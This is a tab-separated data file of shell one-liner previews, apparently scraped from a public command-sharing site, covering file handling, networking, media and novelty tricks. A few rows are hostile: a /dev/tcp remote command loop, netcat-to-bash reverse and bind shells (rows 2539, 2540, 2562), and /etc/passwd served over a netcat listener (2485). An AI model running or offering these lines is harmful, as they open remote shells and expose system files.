id	command_preview	group_id
2337	brew update && brew upgrade `brew outdated`	2114
2338	xloadimage <(ssh USER@HOSTNAME DISPLAY=:0.0 import -window root png:-)	2115
2339	cat /proc/PID/limits	2116
2340	:w !diff -u % -	2117
2341	tar xfz filename.tar.gz -C PathToDirectory	2118
2342	seq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i<=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"\n":"\	2119
2343	IFS=$'\n' && for f in `find . -type f -exec md5sum "{}" \;`; do echo $f | sed -r 's/^[^ ]+/Checking:	2120
2344	imgur(){ $*|convert label:@- png:-|curl -F "image=@-" -F "key=1913b4ac473c692372d108209958fd15" http	2121
2345	gpg --gen-random --armor 1 30	2122
2346	pkill -KILL -u username	2123
2347	fsck.ext4 -cDfty -C 0 /dev/sdxx	2124
2348	shuf -n1 -e *	2125
2349	lsmac() { ifconfig -a | sed '/eth\|wl/!d;s/   Link.*HWaddr//' ; }	2126
2350	ssh -NR 0.0.0.0:2222:127.0.0.1:22 user@jump.host.com	2127
2351	MIN=10;for ((i=MIN*60;i>=0;i--));do echo -ne "\r$(date -d"0+$i sec" +%H:%M:%S)";sleep 1;done	2128
2352	find . -type f | awk -F'.' '{print $NF}' | sort| uniq -c | sort -g	2129
2353	curl -I http://localhost	2130
2354	:%!xxd	2131
2355	ssh-keygen -l -f ~/.ssh/known_hosts	2132
2356	kill -9 `ps -xaw -o state -o ppid | grep Z | grep -v PID | awk '{print $2}'`	2133
2357	echo rm *.txt	2134
2358	awk '{ $5=""; print }' file	2135
2359	curl ifconfig.me	2136
2360	for i in `seq 0 100`;do timeout 6 dialog --gauge "Install..." 6 40 "$i";done	2137
2361	:> file	2138
2362	DISPLAY=:0.0 XAUTHORITY=~/.Xauthority notify-send test	2139
2363	screen /dev/tty<device> 9600	2140
2364	:%d	2141
2365	cat WAR_AND_PEACE_By_LeoTolstoi.txt | tr -cs "[:alnum:]" "\n"| tr "[:lower:]" "[:upper:]" | awk '{h[	2142
2366	who loves mum	2143
2367	twistd -n web --path .	2144
2368	rdesktop -a24 -uAdministrator -pPassword  -r clipboard:CLIPBOARD -r disk:share=~/share -z -g 1280x90	2145
2369	scp -l10 pippo@serverciccio:/home/zutaniddu/* .	2146
2370	pv /dev/zero|ssh $host 'cat > /dev/null'	2147
2371	while [ 1 ]; do banner 'ze missiles, zey are coming! ' | while IFS="\n" read l; do echo "$l"; sleep 	2148
2372	cpan -r	2149
2373	find /path/to/dir -type f -delete	2150
2374	sed -i '/myexpression/d' /path/to/file.txt	2151
2375	dpigs	2152
2376	find . -name "whatever.*" -print0 | rsync -av --files-from=- --from0 ./ ./destination/	2153
2377	AUTOSSH_POLL=1 autossh -M 21010 hostname -t 'screen -Dr'	2154
2378	arecord -q -f cd -r 44100 -c2 -t raw | lame -S -x -h -b 128 - `date +%Y%m%d%H%M`.mp3	2155
2379	yes "$(seq 1 255)" | while read i; do printf "\x1b[48;5;${i}m\n"; sleep .01; done	2156
2380	wget -nv http://en.wikipedia.org/wiki/Linux -O- | egrep -o "http://[^[:space:]]*.jpg" | xargs -P 10 	2157
2381	tar -cf - /home/user/test | gzip -c | ssh user@sshServer 'cd /tmp; tar xfz -'	2158
2382	pgrep -u `id -u` firefox-bin || find ~/.mozilla/firefox -name '*.sqlite'|(while read -e f; do echo '	2159
2383	$ vim ... :help 42	2160
2384	pgrep command_name	2161
2385	id="dMH0bHeiRNg";mplayer -fs http://youtube.com/get_video.php?video_id=$id\&t=$(curl -s http://www.y	2162
2386	column -t /proc/mounts	2163
2387	echo "Body goes here" | mutt -s "A subject" -a /path/to/file.tar.gz recipient@example.com	2164
2388	echo <ctrl-v><esc>c<enter>	2165
2389	curl -u user -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml	2166
2390	complete -W "$(echo $(grep '^ssh ' .bash_history | sort -u | sed 's/^ssh //'))" ssh	2167
2391	ifconfig | perl -nle'/dr:(\S+)/ && print $1'	2168
2392	:let i=0 | 'a,'bg/ZZZZ/s/ZZZZ/\=i/ | let i=i+1	2169
2393	readlink -f ../super/symlink_bon/ahoy	2170
2394	tar czv Pictures | split -d -a 3 -b 16M - pics.tar.gz.	2171
2395	echo $?	2172
2396	shopt -s globstar	2173
2397	for file in <directory A>/*; do rm <directory B>/`basename $file`; done	2174
2398	curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'	2175
2399	read -p "Which station? "; mplayer --reallyquiet -vo none -ao sdl http://somafm.com/startstream=${RE	2176
2400	cd $(dirname $(find ~ -name emails.txt))	2177
2401	sed -r 's/([a-z]+)([A-Z][a-z]+)/\1_\l\2/g' file.txt	2178
2402	echo "screen -DR" >> ~/.bash_profile	2179
2403	mplayer -framedrop -vfm ffmpeg -lavdopts lowres=1:fast:skiploopfilter=all	2180
2404	mkdir $(date +%Y%m%d)	2181
2405	watch "dmesg |tail -15"	2182
2406	dpkg --get-selections > LIST_FILE	2183
2407	lsof -P | grep ':3000'	2184
2408	fc [history-number]	2185
2409	ctrl-z	2186
2410	for i in $(ls *.od{tp}); do unoconv -f pdf $i; done	2187
2411	touch {1..10}.txt	2188
2412	du -cs * .[^\.]* | sort -n	2189
2413	find -name '*wma' -exec ffmpeg -i {} -acodec vorbis -ab 128k {}.ogg \;	2190
2414	cat /etc/*-release	2191
2415	< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6	2192
2416	echo foo bar foobar barfoo && echo !$ !^  !:3 !* &&  echo /usr/bin/foobar&& echo !$:h !$:t	2193
2417	find  ./  -name '*'  -exec  rename  's/\s+/_/g'  {}  \;	2194
2418	sed -e "/$USER/d;s/:.*//g" /etc/group | sed -e :a -e '/$/N;s/\n/ /;ta'	2195
2419	du -sh *	2196
2420	openssl speed md5	2197
2421	awk '{ $1="";print}'	2198
2422	base64 /dev/urandom | head -c 33554432 | split -b 8192 -da 4  - dummy.	2199
2423	!:n	2200
2424	!!; while [ $? -ne 0 ]; do !!; done	2201
2425	echo "main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|i>>6));}" | gcc -x c - && ./a.	2202
2426	color()(set -o pipefail;"$@" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1	2203
2427	find . -name '*.rar' -execdir unrar e {} \;	2204
2428	ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no username@host	2205
2429	find . -maxdepth 1 -size 0c -delete	2206
2430	pv -tpreb /dev/urandom | dd of=file.img	2207
2431	step1 ; step2 ; step3 ; step4 ; curl -o- --get 'https://stream.twitter.com/1/statuses/filter.json' -	2208
2432	step4() { oauth_header="Authorization: OAuth oauth_consumer_key=\"$k1\", oauth_nonce=\"$once\", oaut	2209
2433	step2(){ b="GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&follow%3D${id}%26oauth	2210
2434	step3() { s=$(echo -n $b | openssl dgst -sha1 -hmac $hmac -binary | openssl base64); signature=`for(	2211
2435	aspell -a <<< '<WORDS>'	2212
2436	find / -type f -size +500M -size -1G	2213
2437	while true; do cat /proc/net/dev; sleep 1; done | awk -v dc="date \"+%T\"" '/eth0/{i = $2 - oi; o = 	2214
2438	touch -d $(zenity --calendar --date-format=%F) filename	2215
2439	sort -g -o list.txt{,}	2216
2440	$ history -a #in one shell , and $ history -r #in another running shell	2217
2441	diff -rq dirA dirB	2218
2442	rsync -rv <src> <dst> --progress	2219
2443	read day month year < <(date +'%d %m %y')	2220
2444	cat /sys/class/net/eth0/address	2221
2445	for i in ./*foo*;do mv -- "$i" "${i//foo/bar}";done	2222
2446	dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1	2223
2447	alias screensaver='for ((;;)); do echo -ne "\033[$((1+RANDOM%LINES));$((1+RANDOM%COLUMNS))H\033[$((R	2224
2448	alias rot13="tr a-zA-Z n-za-mN-ZA-M"	2225
2449	script /tmp/log.txt	2226
2450	find . -size +100000k -exec du -h {} \;	2227
2451	alias vim="vim -p"	2228
2452	perl -wlne'/title>([^<]+)/i&&rename$ARGV,"$1.html"' *.html	2229
2453	tar -czvf - /src/dir | ssh remotehost "(cd /dst/dir ; tar -xzvf -)"	2230
2454	Ctrl + [	2231
2455	perl -e 'for(;;){@d=split("",`date +%H%M%S`);print"\r";for(0..5){printf"%.4b ",$d[$_]}sleep 1}'	2232
2456	read -a ARR <<<'world domination now!'; echo ${ARR[2]};	2233
2457	md5sum <<<"test"	2234
2458	parallel -j+0 "zcat {} | bzip2 >{.}.bz2 && rm {}" ::: *.gz	2235
2459	php -i	2236
2460	atb() { l=$(tar tf $1); if [ $(echo "$l" | wc -l) -eq $(echo "$l" | grep $(echo "$l" | head -n1) | w	2237
2461	while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep "ca fe"	2238
2462	ssh -C -Y -l$USER xserver.mynet.xx 'Xnest -geometry 1900x1150 -query localhost'	2239
2463	find -type l -xtype d	2240
2464	fortune | cowsay -f $(ls /usr/share/cowsay/cows/ | shuf -n1)	2241
2465	cat my.ps | nc -q 1 hp4550.mynet.xx 9100	2242
2466	cat /etc/*release	2243
2467	d="www.dafont.com/alpha.php?";for c in {a..z}; do l=`curl -s "${d}lettre=${c}"|sed -n 's/.*ge=\([0-9	2244
2468	tail -f access.log | pv -l -i10 -r >/dev/null	2245
2469	strace -ff -e write=1,2 -s 1024 -p PID  2>&1 | grep "^ |" | cut -c11-60 | sed -e 's/ //g' | xxd -r -	2246
2470	while :;do killall -USR1 dd;sleep 1;done	2247
2471	dmidecode -t 17 | awk -F":" '/Speed/ { print $2 }'	2248
2472	scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql	2249
2473	perl -e 'while(1){print"> ";eval<>}'	2250
2474	nmap -T4 -sP 192.168.2.0/24 && egrep "00:00:00:00:00:00" /proc/net/arp	2251
2475	mail -s "subject" user@todomain.com <emailbody.txt  -- -f customfrom@fromdomain.com -F 'From Display	2252
2476	find . -type d -empty -delete	2253
2477	lsof -p $(pidof firefox) | awk '/.mozilla/ { s = int($7/(2^20)); if(s>0) print (s)" MB -- "$9 | "sor	2254
2478	colordiff -yW"`tput cols`" /path/to/file1 /path/to/file2	2255
2479	grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'	2256
2480	curl -s "http://www.geody.com/geoip.php?ip=$(curl -s icanhazip.com)" | sed '/^IP:/!d;s/<[^>][^>]*>//	2257
2481	curl http://www.whatismyip.org/	2258
2482	VBoxManage internalcommands converttoraw winxp.vdi winxp.raw && qemu-img convert -O vmdk winxp.raw w	2259
2483	sh -c 'S=askapache R=htaccess; find . -mount -type f|xargs -P5 -iFF grep -l -m1 "$S" FF|xargs -P5 -i	2260
2484	find -type f -name "*.avi" -print0 | xargs -0  mplayer -vo dummy -ao dummy -identify 2>/dev/null | p	2261
2485	cat /etc/passwd | openssl aes-256-cbc -a -e -pass pass:password | netcat -l -p 8080	2262
2486	ls -lct /etc | tail -1 | awk '{print $6, $7}'	2263
2487	while read server; do ssh -n user@$server "command"; done < servers.txt	2264
2488	ls | while read f; do mv "$f" "${f// /_}";done	2265
2489	find . -type f -printf '%20s %p\n' | sort -n | cut -b22- | tr '\n' '\000' | xargs -0 ls -laSr	2266
2490	grep -r --include="*.[ch]" pattern .	2267
2491	taskset -cp <core> <pid>	2268
2492	curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->commandlinefu-contribs-back	2269
2493	ab -n 9000 -c 900 localhost:8080/index.php	2270
2494	ssh -L :: -L :: @	2271
2495	iptables -t nat -A PREROUTING -p tcp --dport [port of your choosing] -j REDIRECT --to-ports 22	2272
2496	ldapsearch -LLL -H ldap://activedirectory.example.com:389 -b 'dc=example,dc=com' -D 'DOMAIN\Joe.Blog	2273
2497	mecp () { scp "$@" ${SSH_CLIENT%% *}:Desktop/; }	2274
2498	echo "$(( 0x10 )) - $(( 010 )) = $(( 0x10 - 010 ))"	2275
2499	find ./ -type f -exec sed -i 's/\t/  /g' {} \;	2276
2500	alt + 1 .	2277
2501	ifconfig en1 | awk '/inet / {print $2}' | mail -s "hello world" email@email.com	2278
2502	cal 09 1752	2279
2503	script /dev/null | tee /dev/pts/3	2280
2504	mtr --report --report-cycles 10 www.google.com > google_net_report.txt	2281
2505	alias rot13="tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"	2282
2506	while true; do X=$Y; sleep 1; Y=$(ifconfig eth0|grep RX\ bytes|awk '{ print $2 }'|cut -d : -f 2); ec	2283
2507	swapoff -a ; swapon -a	2284
2508	ls | while read ITEM; do echo "$ITEM"; done	2285
2509	dd if=/dev/cdrom | pv -s 700m | md5sum | tee test.md5	2286
2510	tcptraceroute www.google.com	2287
2511	jhead -autorot *.jpg	2288
2512	!date	2289
2513	hdparm -i[I] /dev/sda	2290
2514	split -b 19m file Nameforpart	2291
2515	while [ 1 ]; do curl -s -u username:password  http://twitter.com/statuses/friends_timeline.rss|grep 	2292
2516	vimtutor	2293
2517	ps aux | grep [h]ttpd	2294
2518	rename 's/foo/bar/g' *	2295
2519	perl -pi.bk -e's/foo/bar/g' file1 file2 fileN	2296
2520	sudo who | awk '!/root/{ cmd="/sbin/pkill -KILL -u " $1; system(cmd)}'	2297
2521	paste -d: <(ls -1 *.mp4) <(ls -1 *.srt) | while read line; do movie="${line%%:*}"; subtitle="${line#	2298
2522	ssh -J user@reachable_host user@unreacheable_host	2299
2523	chmod 777 !*	2300
2524	command systemctl --no-page --no-legend --plain -t service --state=running	2301
2525	cat *.jpg | ffmpeg -f image2pipe -r 1 -vcodec mjpeg -i - -vcodec libx264 out.mp4	2302
2526	perl -e 'for(;;sleep 1){printf"\r"."%.4b "x6,split"",`date +%H%M%S`}'	2303
2527	nik=clf$RANDOM;sr=irc.efnet.org;expect -c "set timeout -1;spawn nc $sr 6666;set send_human {.1 .2 1 	2304
2528	clear;while true;sleep 1;do for((a=1;a<=$(tput cols)/3;a++));do tput cup 0 $a;echo " " $(date);done;	2305
2529	<ctrl>+o	2306
2530	server$ while true; do read -n30 ui; echo $ui |openssl enc -aes-256-ctr -a -k PaSSw; done | nc -l -p	2307
2531	Ctrl+k	2308
2532	ln -s /BASE/* /TARGET/	2309
2533	rsync -v -r --size-only --compare-dest=../A/ B/ C/	2310
2534	<Meta-p> (aka <ALT+P>)	2311
2535	if [[ ":$PATH:" != *":$dir:"* ]]; then PATH=${PATH}:$dir; fi	2312
2536	inotifywait -m -r .	2313
2537	python -c 'import sys, yaml, json; yaml.safe_dump(json.load(sys.stdin), sys.stdout, default_flow_sty	2314
2538	Q="YOURSEARCH"; GOOG_URL="http://www.google.com/search?q="; AGENT="Mozilla/4.0"; stream=$(curl -A "$	2315
2539	exec 5<>/dev/tcp/<your-box>/8080;cat <&5 | while read line; do $line 2>&5 >&5; done	2316
2540	mkfifo foo ; nc -lk 2600 0<foo | /bin/bash 1>foo	2317
2541	find . -type f -print0 | xargs -0 du -h | sort -hr | head -10	2318
2542	curl ifconfig.me/all	2319
2543	up() { local x='';for i in $(seq ${1:-1});do x="$x../"; done;cd $x; }	2320
2544	ls ${PATH//:/ }	2321
2545	printf "%$(tput cols)s\n"|tr ' ' '='	2322
2546	step1() { k1="Consumer key" ; k2="Consumer secret" ; k3="Access token" ; k4="Access token secret" ; 	2323
2547	ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 && echo ONLINE || echo OFFLINE	2324
2548	diff <(exiftool img_1.jpg) <(exiftool img_2.jpg)	2325
2549	dpkg-repack firefox	2326
2550	xmlstarlet sel -t -c "/path/to/element" file.xml	2327
2551	awk 'NR >= 3 && NR <= 6' /path/to/file	2328
2552	tcpdump -w - |pv -bert >/dev/null	2329
2553	cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 32	2330
2554	var=:foobar:; echo ${var:1:-1}	2331
2555	cat <file> > /dev/null	2332
2556	export PS1="[\u@`hostname -I` \W]$ "	2333
2557	command > >(tee stdout.log) 2> >(tee stderr.log >&2)	2334
2558	sed -e '/\\$/{:0;N;s/\\\n//;t0}'	2335
2559	lower() { echo ${@,,}; }	2336
2560	ls -l /etc/**/*killall	2337
2561	convert input.png -alpha set -channel A -fx 0.5 output.png	2338
2562	mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe	2339
2563	awk '(length > n) {n = length} END {print n}'	2340
2564	shopt -s histappend ; PROMPT_COMMAND="history -a;$PROMPT_COMMAND"	2341
2565	ssh vm-user@`VBoxManage guestproperty get "vm-name" "/VirtualBox/GuestInfo/Net/0/V4/IP" | awk '{ pri	2342
2566	sudo socat TCP4-LISTEN:80,bind=127.0.0.1,fork EXEC:'echo "HTTP/1.1 503 Service Unavailable";'	2343
2567	arr[i*100+j]="whatever"	2344
2568	echo "Terrorist threat level: `od -An -N1 -i /dev/random`"	2345
2569	wget -e robots=off -E -H -k -K -p http://<page>	2346
2570	echo "this is a test" | sed 's/.*/\L&/; s/[a-z]*/\u&/g'	2347
2571	rtfm() { help $@ || info $@ || man $@ || $BROWSER "http://www.google.com/search?q=$@"; }	2348
2572	ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip	2349
2573	xargs -n 2 mv < file_with_colums_of_names	2350
2574	> file	2351
2575	tail -f file | awk '{now=strftime("%F %T%z\t");sub(/^/, now);print}'	2352
2576	`!!`	2353
2577	badblocks -n -s -b 2048 /dev/sdX	2354
2578	ontouchdo(){ while :; do a=$(stat -c%Y "$1"); [ "$b" != "$a" ] && b="$a" && sh -c "$2"; sleep 1; don	2355
2579	truncate -s 1M file	2356
2580	/usr/bin/man $* || w3m -dump http://google.com/search?q="$*"\&btnI | less	2357
2581	alias alert='notify-send -i /usr/share/icons/gnome/32x32/apps/gnome-terminal.png "[$?] $(history|tai	2358
2582	lsof /folder	2359
2583	blkid /dev/sda7	2360
2584	mussh -h host1 host2 host3 -c uptime	2361
2585	exec 2>&1	2362
2586	dig +short @resolver1.opendns.com myip.opendns.com	2363
2587	echo ${fullpath##*/}	2364
2588	for i in {0..255}; do echo -e "\e[38;05;${i}m${i}"; done | column -c 80 -s '  '; echo -e "\e[m"	2365
2589	indent -kr hello.c	2366
2590	echo 'some command' | batch	2367
2591	mysqldump -q --skip-opt --force --log-error=dbname_error.log -uroot -pmysqlpassword dbname | ssh -C 	2368
2592	tail -fs 1 somefile	2369
2593	dd if=/dev/zero | pv | dd of=/dev/null	2370
2594	cd() { if [ -z "$1" ]; then command cd; else if [ -f "$1" ]; then command cd $(dirname "$1"); else c	2371
2595	ssh -o UserKnownHostsFile=/dev/null root@192.168.1.1	2372
2596	dd if=/dev/nst0 |pv|dd of=restored_file.tar	2373
2597	curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] | grep -v _cur	2374
2598	count="1" ; while true ; do read next ; if [[ "$next" = "$last" ]] ; then count=$(($count+1)) ; echo	2375
2599	mwiki() { dig +short txt "$*".wp.dg.cx; }	2376
2600	python -c 'print "-"*50'	2377
2601	ruby -e "i=0;loop{puts ' '*(29*(Math.sin(i)/2+1))+'|'*(29*(Math.cos(i)/2+1)); i+=0.1}"	2378
2602	grep "^V<TAB>" your_file	2379
2603	echo "message" | smbclient -M NAME_OF_THE_COMPUTER	2380
2604	mplayer -novideo something.mpg	2381
2605	mplayer -vo null something.mpg	2382
2606	any_script.sh < <(some command)	2383
2607	myinfo() { info --subnodes -o - $1 | less; }	2384
2608	username=matthewbauer; curl -s http://www.commandlinefu.com/commands/by/$username/json | tr '{' '\n'	2385
2609	for f in *;do mv "$f" "${f// /_}";done	2386
2610	!$	2387
2611	alias rc='ssh ${MEDIAPCHOSTNAME} env DISPLAY=:0.0 rhythmbox-client --no-start'	2388
2612	find . ! -name <FILENAME> -delete	2389
2613	grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk '/install / {print $4}' | uniq | xargs apt-get -y r	2390
2614	curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -onroot -fill stdin	2391
2615	setterm -powersave off -blank 0	2392
2616	watch -n60 du /var/log/messages	2393
2617	mmv 'banana_*_*.asc' 'banana_#2_#1.asc'	2394
2618	[ `date --date='next day' +'%B'` == `date +'%B'` ] || echo 'end of month'	2395
2619	for i in {21..29}; do nc -v -n -z -w 1 192.168.0.$i 443; done	2396
2620	echo $(date +%s) > start-time; URL=http://www.google.com; while true; do echo $(curl -L --w %{speed_	2397
2621	(IFS=:;for p in $PATH; do test -d $p || echo $p; done)	2398
2622	fd [query]	91
2623	fd -e [extension]	2399
2624	find . -type f -name "*.[extension]"	2399
2625	locate "*.[extension]"	2399
2626	Up - CursorUp
Down - CursorDown
Right - CursorRight
Left - CursorLeft
ShiftUp - SelectUp
ShiftDown -	2400
2627	Alt-f - WordRight
Alt-b - WordLeft
Alt-a - StartOfLine
Alt-e - EndOfLine	2401
2628	F2 - Save
F3 - Find
F4 - Quit
F7 - Find
F10 - Quit
Esc - Escape	2402
2629	MouseWheelUp - ScrollUp
MouseWheelDown - ScrollDown
MouseLeft - MousePress
MouseMiddle - PastePrimar	2403
2630	gnuchess\n
\n
White (1) : Nf3\n
1. Nf3\n
\n
black  KQkq\n
\n
r n b q k b n r \n
p p p p p p p p \n
.	2405
